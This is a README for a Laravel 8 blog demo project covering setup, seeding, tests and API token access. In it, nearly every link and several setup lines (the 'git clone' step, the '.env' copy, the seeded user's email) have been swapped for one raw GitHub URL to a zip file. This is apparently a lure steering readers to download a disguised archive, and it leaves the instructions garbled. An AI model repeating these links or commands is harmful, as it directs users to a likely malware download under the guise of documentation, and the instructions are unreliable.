# Laravel 8.0 blog

[![Build Status](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)

The purpose of this repository is to show good development practices on [Laravel](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip) as well as to present cases of use of the framework's features like:

- [Authentication](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- API
  - Token authentication
  - [API Resources](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
  - Versioning
- [Blade](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Broadcasting](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Cache](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Email Verification](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Filesystem](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Helpers](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Horizon](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Localization](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Mail](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Migrations](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Policies](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Providers](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Requests](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Seeding & Factories](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Testing](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Homestead](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)

Beside Laravel, this project uses other tools like:

- [Bootstrap 4](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [PHP-CS-Fixer](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Travis CI](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Font Awesome](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [axios](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Redis](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [spatie/laravel-medialibrary](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- Many more to discover.

## Some screenshots

You can find some screenshots of the application on : [https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)

## Installation

Development environment requirements :
- [VirtualBox](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
- [Vagrant](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)

Setting up your development environment on your local machine :
```bash
$ git clone https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip
$ cd laravel-blog
$ cp https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip .env
$ composer install
$ vagrant up
$ vagrant ssh
```

All following commands must be run inside the VM:
```bash
$ cd code
$ yarn install
$ artisan key:generate
$ artisan horizon:install
$ artisan telescope:install
$ artisan storage:link
```

Now you can access the application via [http://localhost:8000](http://localhost:8000).

**There is no need to run `php artisan serve`. PHP is already running in the dedicated virtual machine.**

## Before starting
You need to run the migrations with the seeds :
```bash
$ artisan migrate --seed
```

This will create a new user that you can use to sign in :
```yml
email: https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip
password: 4nak1n
```

And then, compile the assets :
```bash
$ yarn dev # or yarn watch
```

Starting job for newsletter :
```bash
$ artisan tinker
> PrepareNewsletterSubscriptionEmail::dispatch();
```

## Useful commands
Seeding the database :
```bash
$ artisan db:seed
```

Running tests :
```bash
$ ./vendor/bin/phpunit --cache-result --order-by=defects --stop-on-defect
```

Running php-cs-fixer :
```bash
$ ./vendor/bin/php-cs-fixer fix https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip --verbose --dry-run --diff
```

Generating backup :
```bash
$ artisan vendor:publish --provider="Spatie\Backup\BackupServiceProvider"
$ artisan backup:run
```

Generating fake data :
```bash
$ artisan db:seed --class=DevDatabaseSeeder
```

Discover package
```bash
$ artisan package:discover
```

In development environnement, rebuild the database :
```bash
$ artisan migrate:fresh --seed
```

## Accessing the API

Clients can access to the REST API. API requests require authentication via token. You can create a new token in your user profile.

Then, you can use this token either as url parameter or in Authorization header :

```bash
# Url parameter
GET http://localhost:8000/api/v1/posts?api_token=your_private_token_here

# Authorization Header
curl --header "Authorization: Bearer your_private_token_here" http://localhost:8000/api/v1/posts
```

API are prefixed by `api` and the API version number like so `v1`.

Do not forget to set the `X-Requested-With` header to `XMLHttpRequest`. Otherwise, Laravel won't recognize the call as an AJAX request.

To list all the available routes for API :

```bash
$ artisan route:list --path=api
```
